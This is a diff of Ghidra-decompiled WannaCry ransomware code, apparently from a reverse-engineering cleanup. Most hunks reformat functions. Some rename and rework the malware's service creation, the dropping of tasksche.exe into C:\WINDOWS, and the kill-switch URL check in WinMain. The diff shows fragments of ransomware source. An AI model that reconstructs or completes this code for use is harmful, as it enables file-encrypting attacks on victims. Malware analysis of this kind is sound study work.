@@ -692,12 +692,7 @@ struct StringInfo {
 
 typedef int (* _onexit_t)(void);
 
-
-
-
-void FUN_00401010(void)
-
-{
+void FUN_00401010(void) {
   undefined local_2;
   undefined local_1;
   
@@ -705,11 +700,7 @@ void FUN_00401010(void)
   return;
 }
 
-
-
-char * __cdecl FUN_00401140(char *param_1,char *param_2,int param_3)
-
-{
+char * __cdecl FUN_00401140(char *param_1,char *param_2,int param_3) {
   char cVar1;
   byte bVar2;
   int iVar3;
@@ -751,12 +742,8 @@ char * __cdecl FUN_00401140(char *param_1,char *param_2,int param_3)
   return (char *)0x0;
 }
 
-
-
 uint __cdecl
-FUN_00401190(undefined4 *param_1,uint param_2,undefined4 *param_3,char *param_4,char *param_5)
-
-{
+FUN_00401190(undefined4 *param_1,uint param_2,undefined4 *param_3,char *param_4,char *param_5) {
   char cVar1;
   char *pcVar2;
   uint uVar3;
@@ -915,11 +902,7 @@ FUN_00401190(undefined4 *param_1,uint param_2,undefined4 *param_3,char *param_4,
   return param_2;
 }
 
-
-
-void FUN_00401310(void)
-
-{
+void FUN_00401310(void) {
   int **ppiVar1;
   int **ppiVar2;
   int **ppiVar3;
@@ -953,15 +936,11 @@ void FUN_00401310(void)
   return;
 }
 
-
-
 void __cdecl
 FUN_00401370(int *param_1,undefined4 param_2,int *param_3,undefined4 param_4,int *param_5,
             undefined4 param_6,double param_7,int *param_8,undefined4 param_9,int *param_10,
             undefined4 param_11,DWORD param_12,undefined4 param_13,int *param_14,undefined4 param_15
-            ,int *param_16,undefined4 param_17,double param_18,uint param_19)
-
-{
+            ,int *param_16,undefined4 param_17,double param_18,uint param_19) {
   double dVar1;
   short sVar2;
   int *piVar3;
@@ -1053,13 +1032,9 @@ LAB_00401640:
   } while( true );
 }
 
-
-
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
-void __cdecl FUN_00401660(uint param_1,uint param_2)
-
-{
+void __cdecl FUN_00401660(uint param_1,uint param_2) {
   DWORD dwMilliseconds;
   BOOL BVar1;
   int iVar2;
@@ -1114,11 +1089,7 @@ LAB_0040178b:
   return;
 }
 
-
-
-int __cdecl FUN_004017b0(undefined4 param_1,undefined *param_2)
-
-{
+int __cdecl FUN_004017b0(undefined4 param_1,undefined *param_2) {
   char cVar1;
   char *pcVar2;
   int iVar3;
@@ -1302,13 +1273,9 @@ int __cdecl FUN_004017b0(undefined4 param_1,undefined *param_2)
   return iVar3;
 }
 
-
-
 // WARNING: Could not reconcile some variable overlaps
 
-undefined4 __cdecl FUN_00401980(undefined4 param_1)
-
-{
+undefined4 __cdecl FUN_00401980(undefined4 param_1) {
   undefined2 uVar1;
   int iVar2;
   int iVar3;
@@ -1403,13 +1370,9 @@ undefined4 __cdecl FUN_00401980(undefined4 param_1)
   return 0;
 }
 
-
-
 // WARNING: Could not reconcile some variable overlaps
 
-undefined4 __cdecl FUN_00401b70(undefined4 param_1,undefined4 param_2)
-
-{
+undefined4 __cdecl FUN_00401b70(undefined4 param_1,undefined4 param_2) {
   undefined uVar1;
   int iVar2;
   int iVar3;
@@ -1492,14 +1455,10 @@ LAB_00401d4d:
   return 0;
 }
 
-
-
 // WARNING: Could not reconcile some variable overlaps
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
-void FUN_00401d80(void)
-
-{
+void FUN_00401d80(void) {
   int iVar1;
   undefined4 *puVar2;
   undefined4 *puVar3;
@@ -6356,31 +6315,19 @@ void FUN_00401d80(void)
   return;
 }
 
-
-
-undefined4 __cdecl FUN_00406eb0(undefined4 param_1,int param_2)
-
-{
+undefined4 __cdecl FUN_00406eb0(undefined4 param_1,int param_2) {
   if (param_2 == 0) {
     return 1;
   }
   return 0;
 }
 
-
-
-uint __cdecl FUN_00406ed0(uint param_1)
-
-{
+uint __cdecl FUN_00406ed0(uint param_1) {
   return ((param_1 & 0xff00 | param_1 << 0x10) << 8 | (param_1 & 0xff0000 | param_1 >> 0x10) >> 8) ^
          param_1 * 2;
 }
 
-
-
-undefined4 __cdecl FUN_00406f00(undefined4 param_1,int param_2,int param_3)
-
-{
+undefined4 __cdecl FUN_00406f00(undefined4 param_1,int param_2,int param_3) {
   uint uVar1;
   uint uVar2;
   undefined4 uStack8;
@@ -6402,20 +6349,14 @@ undefined4 __cdecl FUN_00406f00(undefined4 param_1,int param_2,int param_3)
   } while ((int)uVar1 < param_3);
   return 0;
 }
-
-
 /*
 Unable to decompile 'FUN_00406f50'
 Cause: 
 Low-level Error: Cannot properly adjust input varnodes
 */
-
-
 // WARNING: Could not reconcile some variable overlaps
 
-undefined4 __cdecl FUN_004072a0(undefined4 param_1,undefined4 param_2)
-
-{
+undefined4 __cdecl FUN_004072a0(undefined4 param_1,undefined4 param_2) {
   undefined uVar1;
   int iVar2;
   undefined4 uVar3;
@@ -6494,13 +6435,9 @@ undefined4 __cdecl FUN_004072a0(undefined4 param_1,undefined4 param_2)
   return 0;
 }
 
-
-
 // WARNING: Could not reconcile some variable overlaps
 
-undefined4 __cdecl FUN_00407480(undefined4 param_1)
-
-{
+undefined4 __cdecl FUN_00407480(undefined4 param_1) {
   int iVar1;
   undefined4 uVar2;
   undefined2 *puStack316;
@@ -6546,11 +6483,7 @@ undefined4 __cdecl FUN_00407480(undefined4 param_1)
   return uVar2;
 }
 
-
-
-void FUN_00407620(void)
-
-{
+void FUN_00407620(void) {
   BOOL BVar1;
   int iVar2;
   
@@ -6566,11 +6499,7 @@ void FUN_00407620(void)
   return;
 }
 
-
-
-int FUN_00407660(void)
-
-{
+int FUN_00407660(void) {
   int iVar1;
   int local_4;
   
@@ -6584,8 +6513,6 @@ int FUN_00407660(void)
   return local_4;
 }
 
-
-
 // WARNING: Removing unreachable block (ram,0x00407797)
 // WARNING: Removing unreachable block (ram,0x004077a4)
 // WARNING: Removing unreachable block (ram,0x004077b3)
@@ -6596,9 +6523,7 @@ int FUN_00407660(void)
 // _StartAddress parameter of _beginthreadex
 // 
 
-undefined4 _StartAddress_00407720(void)
-
-{
+undefined4 _StartAddress_00407720(void) {
   undefined4 *in_FS_OFFSET;
   undefined4 local_c;
   undefined *puStack8;
@@ -6616,11 +6541,7 @@ undefined4 _StartAddress_00407720(void)
   return 0;
 }
 
-
-
-undefined4 FUN_00407a20(void)
-
-{
+undefined4 FUN_00407a20(void) {
   uint uVar1;
   HANDLE hFile;
   DWORD nNumberOfBytesToRead;
@@ -6706,11 +6627,7 @@ undefined4 FUN_00407a20(void)
   return 1;
 }
 
-
-
-undefined4 FUN_00407b90(void)
-
-{
+undefined4 FUN_00407b90(void) {
   int iVar1;
   undefined4 uVar2;
   undefined local_190 [400];
@@ -6724,11 +6641,7 @@ undefined4 FUN_00407b90(void)
   return uVar2;
 }
 
-
-
-undefined4 FUN_00407bd0(void)
-
-{
+undefined4 FUN_00407bd0(void) {
   int iVar1;
   HANDLE hObject;
   void *_ArgList;
@@ -6754,11 +6667,7 @@ undefined4 FUN_00407bd0(void)
   return 0;
 }
 
-
-
-undefined4 FUN_00407bda(void)
-
-{
+undefined4 FUN_00407bda(void) {
   HANDLE hObject;
   void *_ArgList;
   
@@ -6779,15 +6688,12 @@ undefined4 FUN_00407bda(void)
   return 0;
 }
 
-
-
 void create_wannacry_service() {
   SC_HANDLE hSCManager;
   SC_HANDLE hService;
   char exec_with_args [260];
   
-                    // C:\Austin\Desktop\wannacry.exe -m security
-                    // 
+  // C:\Austin\Desktop\wannacry.exe -m security
   sprintf(exec_with_args,s__s__m_security_00431330,&executable_path);
   hSCManager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
   if (hSCManager != (SC_HANDLE)0x0) {
@@ -6804,8 +6710,6 @@ void create_wannacry_service() {
   }
   return 0;
 }
-
-
 
 undefined4 write_1831_to_taskche_exe(void) {
   char cVar1;
@@ -6854,28 +6758,34 @@ undefined4 write_1831_to_taskche_exe(void) {
               iVar3 = 0x40;
               taskche_path = '\0';
               puVar11 = &unkown_buffer_nulled;
-              memset(puVar11, 0, 0x40/64);
               
-              // while (iVar3 != 0) {
-              //   iVar3 = iVar3 + -1;
-              //   *puVar11 = 0;
-              //   puVar11 = puVar11 + 1;
-              // }
+              //memset(puVar11, 0, 0x40/64);
+              
+              while (iVar3 != 0) {
+                iVar3 = iVar3 + -1;
+                *puVar11 = 0;
+                puVar11 = puVar11 + 1;
+              }
+
               *(undefined2 *)puVar11 = 0;
               *(undefined *)((int)puVar11 + 2) = 0;
               iVar3 = 0x40;
               qeriu_path = '\0';
               puVar11 = &unkown_buffer2_nulled;
-              memset(puVar11, 0, 0x40/64);
+
+              // memset(puVar11, 0, 0x40/64);
               
-              // while (iVar3 != 0) {
-              //   iVar3 = iVar3 + -1;
-              //   *puVar11 = 0;
-              //   puVar11 = puVar11 + 1;
-              // }
+              while (iVar3 != 0) {
+                iVar3 = iVar3 + -1;
+                *puVar11 = 0;
+                puVar11 = puVar11 + 1;
+              }
+
               *(undefined2 *)puVar11 = 0;
               *(undefined *)((int)puVar11 + 2) = 0;
+              // C:\WINDOWS\taskche.exe
               sprintf(&taskche_path, s_C___s__s_00431358, s_WINDOWS_00431364, s_tasksche_exe_0043136c);
+              // C:\Windows\qeriuwjhrf
               sprintf(&qeriu_path, s_C___s_qeriuwjhrf_00431344, s_WINDOWS_00431364, unaff_EDI);
               MoveFileExA(&taskche_path,&qeriu_path, 1);
               createdFileHandle = (*createFileA)(&taskche_path, 0x40000000, 0, (LPSECURITY_ATTRIBUTES)0x0, 2, 4,(HANDLE)0x0);
@@ -6888,11 +6798,14 @@ undefined4 write_1831_to_taskche_exe(void) {
                 res1831_locked.dwThreadId = 0;
                 iVar3 = 0x10;
                 ppCVar7 = &_Stack592.lpReserved;
+                
+                //strcat(tasksche_path, "/i");
                 while (iVar3 != 0) {
                   iVar3 = iVar3 + -1;
                   *ppCVar7 = (LPSTR)0x0;
                   ppCVar7 = ppCVar7 + 1;
                 }
+                
                 uVar4 = 0xffffffff;
                 ppuVar6 = &PTR_DAT_00431340;
                 do {
@@ -6931,6 +6844,7 @@ undefined4 write_1831_to_taskche_exe(void) {
                   ppuVar6 = (undefined **)((int)ppuVar6 + 1);
                   puVar11 = (undefined4 *)((int)puVar11 + 1);
                 }
+
                 hObject = (HANDLE)0x0;
                 createdFileHandle = (HANDLE)0x0;
                 _Stack592.cb = 0x44;
@@ -6980,8 +6894,6 @@ void __cdecl FUN_00407fa0(SC_HANDLE param_1,int param_2) {
   return;
 }
 
-
-
 void wannacry_real_entry(void) {
   int *argc;
   SC_HANDLE hSCManager;
@@ -7019,25 +6931,27 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nC
   HINTERNET hInternet;
   HINTERNET hinternet_return;
   int i;
-  char *srange_url;
-  char *strange_url_copy;
-  char strange_url_buffer [57];
+  char *killswitch_url;
+  char *killswitch_url_copy;
+  char killswitch_url_buffer [57];
   
   i = 14;
-  srange_url = s_http___www_iuqerfsodp9ifjaposdfj_004313d0;
-  strange_url_copy = strange_url_buffer;
-  
-  strncpy(strange_url_copy, strange_url, 14);
-  // while (i != 0) {
-  //   i = i + -1;
-  //   *(undefined4 *)strange_url_copy = *(undefined4 *)srange_url;
-  //   srange_url = srange_url + 4;
-  //   strange_url_copy = strange_url_copy + 4;
-  // }
+  //killswitch_url = s_http___www_iuqerfsodp9ifjaposdfj_004313d0;
+  killswitch_url = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";
 
-  *strange_url_copy = *srange_url;
+  killswitch_url_copy = killswitch_url_buffer;
+  
+  //strncpy(killswitch_url_copy, killswitch_url, 14);
+  while (i != 0) {
+    i = i + -1;
+    *(undefined4 *)killswitch_url_copy = *(undefined4 *)killswitch_url;
+    killswitch_url = killswitch_url + 4;
+    killswitch_url_copy = killswitch_url_copy + 4;
+  }
+
+  *killswitch_url_copy = *killswitch_url;
   InternetOpenA((LPCSTR)0x0,1,(LPCSTR)0x0,(LPCSTR)0x0,0);
-  hinternet_return = InternetOpenUrlA(hInternet,strange_url_buffer,(LPCSTR)0x0,0,0x84000000,0);
+  hinternet_return = InternetOpenUrlA(hInternet,killswitch_url_buffer,(LPCSTR)0x0,0,0x84000000,0);
 
   if (hinternet_return == (HINTERNET)0x0) {
     InternetCloseHandle(hInternet);
@@ -7264,6 +7178,7 @@ void __thiscall FUN_00408390(void *this,int **param_1,int **param_2) {
       }
     } while (ppiVar6 != *(int ***)(*(int *)((int)this + 4) + 4));
   }
+
   *(undefined4 *)(*(int *)(*(int *)((int)this + 4) + 4) + 0x14) = 1;
   *(int ***)param_1 = ppiVar5;
   *(undefined *)(param_1 + 1) = 1;
@@ -7550,11 +7465,7 @@ LAB_00408997:
   return;
 }
 
-
-
-void FUN_004089d0(int *param_1)
-
-{
+void FUN_004089d0(int *param_1) {
   int *piVar1;
   
   if (param_1 != DAT_0070f878) {
@@ -7568,11 +7479,7 @@ void FUN_004089d0(int *param_1)
   return;
 }
 
-
-
-void __fastcall FUN_00408a10(int *param_1)
-
-{
+void __fastcall FUN_00408a10(int *param_1) {
   undefined4 *puVar1;
   undefined4 *puVar2;
   int iVar3;
@@ -7600,11 +7507,7 @@ void __fastcall FUN_00408a10(int *param_1)
   return;
 }
 
-
-
-void __thiscall FUN_00408a60(void *this,int **param_1,int *param_2,int **param_3,int *param_4)
-
-{
+void __thiscall FUN_00408a60(void *this,int **param_1,int *param_2,int **param_3,int *param_4) {
   int **ppiVar1;
   int *piVar2;
   int **ppiVar3;
@@ -7766,11 +7669,7 @@ LAB_00408c9c:
   return;
 }
 
-
-
-void __thiscall FUN_00408cd0(void *this,int *param_1)
-
-{
+void __thiscall FUN_00408cd0(void *this,int *param_1) {
   int **ppiVar1;
   int **ppiVar2;
   
@@ -7799,11 +7698,7 @@ void __thiscall FUN_00408cd0(void *this,int *param_1)
   return;
 }
 
-
-
-void __cdecl FUN_00408d30(undefined4 *param_1)
-
-{
+void __cdecl FUN_00408d30(undefined4 *param_1) {
   param_1 = (undefined4 *)*param_1;
   while (param_1 != DAT_0070f878) {
     param_1 = (undefined4 *)*param_1;
@@ -7811,11 +7706,7 @@ void __cdecl FUN_00408d30(undefined4 *param_1)
   return;
 }
 
-
-
-void __thiscall FUN_00408d50(void *this,int *param_1)
-
-{
+void __thiscall FUN_00408d50(void *this,int *param_1) {
   int iVar1;
   int *piVar2;
   
@@ -7844,11 +7735,7 @@ void __thiscall FUN_00408d50(void *this,int *param_1)
   return;
 }
 
-
-
-void FUN_00408db0(undefined4 param_1,undefined4 param_2)
-
-{
+void FUN_00408db0(undefined4 param_1,undefined4 param_2) {
   void *pvVar1;
   
   pvVar1 = operator_new(0x18);
@@ -7857,11 +7744,7 @@ void FUN_00408db0(undefined4 param_1,undefined4 param_2)
   return;
 }
 
-
-
-void __fastcall FUN_00408dd0(int **param_1)
-
-{
+void __fastcall FUN_00408dd0(int **param_1) {
   int *piVar1;
   int *piVar2;
   int **ppiVar3;
@@ -7892,11 +7775,7 @@ void __fastcall FUN_00408dd0(int **param_1)
   return;
 }
 
-
-
-void __cdecl FUN_00408e30(undefined4 *param_1,undefined4 *param_2)
-
-{
+void __cdecl FUN_00408e30(undefined4 *param_1,undefined4 *param_2) {
   if (param_1 != (undefined4 *)0x0) {
     *param_1 = *param_2;
     param_1[1] = param_2[1];
@@ -7904,16 +7783,12 @@ void __cdecl FUN_00408e30(undefined4 *param_1,undefined4 *param_2)
   return;
 }
 
-
-
 // WARNING: Removing unreachable block (ram,0x00408fdb)
 // WARNING: Removing unreachable block (ram,0x00408ff6)
 // WARNING: Removing unreachable block (ram,0x00409005)
 // WARNING: Removing unreachable block (ram,0x0040900c)
 
-void __cdecl FUN_00408e50(undefined4 *param_1,undefined4 param_2)
-
-{
+void __cdecl FUN_00408e50(undefined4 *param_1,undefined4 param_2) {
   undefined4 uVar1;
   int iVar2;
   int iVar3;
@@ -7995,19 +7870,11 @@ void __cdecl FUN_00408e50(undefined4 *param_1,undefined4 param_2)
   return;
 }
 
-
-
-void FUN_00409040(void)
-
-{
+void FUN_00409040(void) {
   return;
 }
 
-
-
-undefined4 * FUN_00409050(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3)
-
-{
+undefined4 * FUN_00409050(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3) {
   if (param_1 == param_2) {
     return param_3;
   }
@@ -8021,11 +7888,7 @@ undefined4 * FUN_00409050(undefined4 *param_1,undefined4 *param_2,undefined4 *pa
   return param_3;
 }
 
-
-
-void FUN_00409080(undefined4 *param_1,int param_2,undefined4 *param_3)
-
-{
+void FUN_00409080(undefined4 *param_1,int param_2,undefined4 *param_3) {
   if (param_2 != 0) {
     do {
       if (param_1 != (undefined4 *)0x0) {
@@ -8038,22 +7901,14 @@ void FUN_00409080(undefined4 *param_1,int param_2,undefined4 *param_3)
   return;
 }
 
-
-
-void __cdecl FUN_004090b0(undefined4 *param_1,undefined4 *param_2)
-
-{
+void __cdecl FUN_004090b0(undefined4 *param_1,undefined4 *param_2) {
   if (param_1 != (undefined4 *)0x0) {
     *param_1 = *param_2;
   }
   return;
 }
 
-
-
-undefined4 __cdecl FUN_004090d0(undefined4 param_1)
-
-{
+undefined4 __cdecl FUN_004090d0(undefined4 param_1) {
   uint uVar1;
   uint uVar2;
   undefined4 unaff_retaddr;
@@ -8070,11 +7925,7 @@ undefined4 __cdecl FUN_004090d0(undefined4 param_1)
   return 0;
 }
 
-
-
-undefined4 __cdecl FUN_00409110(undefined4 param_1)
-
-{
+undefined4 __cdecl FUN_00409110(undefined4 param_1) {
   uint uVar1;
   
   uVar1 = Ordinal_8(param_1);
@@ -8090,11 +7941,7 @@ undefined4 __cdecl FUN_00409110(undefined4 param_1)
   return 0;
 }
 
-
-
-undefined4 FUN_00409160(void)
-
-{
+undefined4 FUN_00409160(void) {
   uint *puVar1;
   uint uVar2;
   uint *puVar3;
@@ -8246,11 +8093,7 @@ LAB_00409431:
   return 0;
 }
 
-
-
-void __thiscall FUN_00409470(void *this,undefined4 *param_1,uint param_2,undefined4 *param_3)
-
-{
+void __thiscall FUN_00409470(void *this,undefined4 *param_1,uint param_2,undefined4 *param_3) {
   undefined4 *puVar1;
   int iVar2;
   int iVar3;
@@ -8382,11 +8225,7 @@ void __thiscall FUN_00409470(void *this,undefined4 *param_1,uint param_2,undefin
   return;
 }
 
-
-
-void __cdecl FUN_00409680(uint *param_1,uint *param_2)
-
-{
+void __cdecl FUN_00409680(uint *param_1,uint *param_2) {
   uint uVar1;
   uint uVar2;
   uint *puVar3;
@@ -8450,11 +8289,7 @@ LAB_004096c8:
   } while( true );
 }
 
-
-
-void __cdecl FUN_00409750(uint *param_1,uint *param_2)
-
-{
+void __cdecl FUN_00409750(uint *param_1,uint *param_2) {
   uint uVar1;
   uint uVar2;
   uint *puVar3;
@@ -8487,187 +8322,119 @@ void __cdecl FUN_00409750(uint *param_1,uint *param_2)
   return;
 }
 
-
-
-void Ordinal_3(void)
-
-{
+void Ordinal_3(void) {
                     // WARNING: Could not recover jumptable at 0x004097b0. Too many branches
                     // WARNING: Treating indirect jump as call
   Ordinal_3();
   return;
 }
 
-
-
-void Ordinal_16(void)
-
-{
+void Ordinal_16(void) {
                     // WARNING: Could not recover jumptable at 0x004097b6. Too many branches
                     // WARNING: Treating indirect jump as call
   Ordinal_16();
   return;
 }
 
-
-
-void Ordinal_19(void)
-
-{
+void Ordinal_19(void) {
                     // WARNING: Could not recover jumptable at 0x004097bc. Too many branches
                     // WARNING: Treating indirect jump as call
   Ordinal_19();
   return;
 }
 
-
-
-void Ordinal_4(void)
-
-{
+void Ordinal_4(void) {
                     // WARNING: Could not recover jumptable at 0x004097c2. Too many branches
                     // WARNING: Treating indirect jump as call
   Ordinal_4();
   return;
 }
 
-
-
-void Ordinal_23(void)
-
-{
+void Ordinal_23(void) {
                     // WARNING: Could not recover jumptable at 0x004097c8. Too many branches
                     // WARNING: Treating indirect jump as call
   Ordinal_23();
   return;
 }
 
-
-
-void Ordinal_9(void)
-
-{
+void Ordinal_9(void) {
                     // WARNING: Could not recover jumptable at 0x004097ce. Too many branches
                     // WARNING: Treating indirect jump as call
   Ordinal_9();
   return;
 }
 
-
-
-void Ordinal_11(void)
-
-{
+void Ordinal_11(void) {
                     // WARNING: Could not recover jumptable at 0x004097d4. Too many branches
                     // WARNING: Treating indirect jump as call
   Ordinal_11();
   return;
 }
 
-
-
-void Ordinal_18(void)
-
-{
+void Ordinal_18(void) {
                     // WARNING: Could not recover jumptable at 0x004097da. Too many branches
                     // WARNING: Treating indirect jump as call
   Ordinal_18();
   return;
 }
 
-
-
-void Ordinal_10(void)
-
-{
+void Ordinal_10(void) {
                     // WARNING: Could not recover jumptable at 0x004097e0. Too many branches
                     // WARNING: Treating indirect jump as call
   Ordinal_10();
   return;
 }
 
-
-
-void Ordinal_12(void)
-
-{
+void Ordinal_12(void) {
                     // WARNING: Could not recover jumptable at 0x004097e6. Too many branches
                     // WARNING: Treating indirect jump as call
   Ordinal_12();
   return;
 }
 
-
-
-void Ordinal_115(void)
-
-{
+void Ordinal_115(void) {
                     // WARNING: Could not recover jumptable at 0x004097ec. Too many branches
                     // WARNING: Treating indirect jump as call
   Ordinal_115();
   return;
 }
 
-
-
-void Ordinal_14(void)
-
-{
+void Ordinal_14(void) {
                     // WARNING: Could not recover jumptable at 0x004097f2. Too many branches
                     // WARNING: Treating indirect jump as call
   Ordinal_14();
   return;
 }
 
-
-
-void Ordinal_8(void)
-
-{
+void Ordinal_8(void) {
                     // WARNING: Could not recover jumptable at 0x004097f8. Too many branches
                     // WARNING: Treating indirect jump as call
   Ordinal_8();
   return;
 }
 
-
-
-void __cdecl FUN_004097fe(void *param_1)
-
-{
+void __cdecl FUN_004097fe(void *param_1) {
   free(param_1);
   return;
 }
 
-
-
-void GetPerAdapterInfo(void)
-
-{
+void GetPerAdapterInfo(void) {
                     // WARNING: Could not recover jumptable at 0x0040980a. Too many branches
                     // WARNING: Treating indirect jump as call
   GetPerAdapterInfo();
   return;
 }
 
-
-
-void GetAdaptersInfo(void)
-
-{
+void GetAdaptersInfo(void) {
                     // WARNING: Could not recover jumptable at 0x00409810. Too many branches
                     // WARNING: Treating indirect jump as call
   GetAdaptersInfo();
   return;
 }
 
-
-
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
-void __cdecl FUN_00409816(_onexit_t param_1)
-
-{
+void __cdecl FUN_00409816(_onexit_t param_1) {
   if (_DAT_0070f898 == -1) {
     _onexit(param_1);
     return;
@@ -8676,24 +8443,16 @@ void __cdecl FUN_00409816(_onexit_t param_1)
   return;
 }
 
-
-
-int __cdecl FUN_00409842(_onexit_t param_1)
-
-{
+int __cdecl FUN_00409842(_onexit_t param_1) {
   int iVar1;
   
   iVar1 = FUN_00409816(param_1);
   return (uint)(iVar1 != 0) - 1;
 }
 
-
-
 // WARNING: Unable to track spacebase fully for stack
 
-void FUN_00409860(void)
-
-{
+void FUN_00409860(void) {
   uint in_EAX;
   undefined *puVar1;
   undefined4 local_res0;
@@ -8709,26 +8468,18 @@ void FUN_00409860(void)
   return;
 }
 
-
-
-void _ftol(void)
-
-{
+void _ftol(void) {
                     // WARNING: Could not recover jumptable at 0x00409890. Too many branches
                     // WARNING: Treating indirect jump as call
   _ftol();
   return;
 }
 
-
-
 // Library Function - Single Match
 // Name: __allrem
 // Library: Visual Studio
 
-undefined8 __allrem(uint param_1,uint param_2,uint param_3,uint param_4)
-
-{
+undefined8 __allrem(uint param_1,uint param_2,uint param_3,uint param_4) {
   ulonglong uVar1;
   longlong lVar2;
   uint uVar3;
@@ -8796,15 +8547,11 @@ LAB_0040994d:
   return CONCAT44(iVar6,iVar5);
 }
 
-
-
 // Library Function - Single Match
 // Name: __alldiv
 // Library: Visual Studio
 
-undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4)
-
-{
+undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4) {
   ulonglong uVar1;
   longlong lVar2;
   uint uVar3;
@@ -8865,13 +8612,9 @@ undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4)
   return CONCAT44(uVar3,iVar4);
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-void * __cdecl operator_new(uint param_1)
-
-{
+void * __cdecl operator_new(uint param_1) {
   void *pvVar1;
   
                     // WARNING: Could not recover jumptable at 0x00409a10. Too many branches
@@ -8880,13 +8623,9 @@ void * __cdecl operator_new(uint param_1)
   return pvVar1;
 }
 
-
-
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
-void entry(void)
-
-{
+void entry(void) {
   undefined4 *puVar1;
   uint nCmdShow;
   HMODULE hInstance;
@@ -8961,65 +8700,41 @@ LAB_00409b09:
   exit(local_6c);
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-void __cdecl free(void *_Memory)
-
-{
+void __cdecl free(void *_Memory) {
                     // WARNING: Could not recover jumptable at 0x00409b74. Too many branches
                     // WARNING: Treating indirect jump as call
   free();
   return;
 }
 
-
-
-void __dllonexit(void)
-
-{
+void __dllonexit(void) {
                     // WARNING: Could not recover jumptable at 0x00409b7a. Too many branches
                     // WARNING: Treating indirect jump as call
   __dllonexit();
   return;
 }
 
-
-
-void _initterm(void)
-
-{
+void _initterm(void) {
                     // WARNING: Could not recover jumptable at 0x00409b86. Too many branches
                     // WARNING: Treating indirect jump as call
   _initterm();
   return;
 }
 
-
-
-void FUN_00409b8c(void)
-
-{
+void FUN_00409b8c(void) {
   _controlfp(0x10000,0x30000);
   return;
 }
 
-
-
-void FUN_00409ba1(void)
-
-{
+void FUN_00409ba1(void) {
   return;
 }
 
-
-
 // WARNING: Exceeded maximum restarts with more pending
 
-uint __cdecl _controlfp(uint _NewValue,uint _Mask)
-
-{
+uint __cdecl _controlfp(uint _NewValue,uint _Mask) {
   uint uVar1;
   
                     // WARNING: Could not recover jumptable at 0x00409ba8. Too many branches
@@ -9028,11 +8743,7 @@ uint __cdecl _controlfp(uint _NewValue,uint _Mask)
   return uVar1;
 }
 
-
-
-void Unwind_00409bb0(void)
-
-{
+void Unwind_00409bb0(void) {
   int unaff_EBP;
   
   FUN_004097fe(*(void **)(unaff_EBP + -0x18));
@@ -9042,11 +8753,7 @@ void Unwind_00409bb0(void)
   return;
 }
 
-
-
-void Unwind_00409bb8(void)
-
-{
+void Unwind_00409bb8(void) {
   int unaff_EBP;
   
   FUN_004097fe(*(void **)(unaff_EBP + -0x28));
@@ -9055,5 +8762,3 @@ void Unwind_00409bb8(void)
   *(undefined4 *)(unaff_EBP + -0x20) = 0;
   return;
 }
-
-
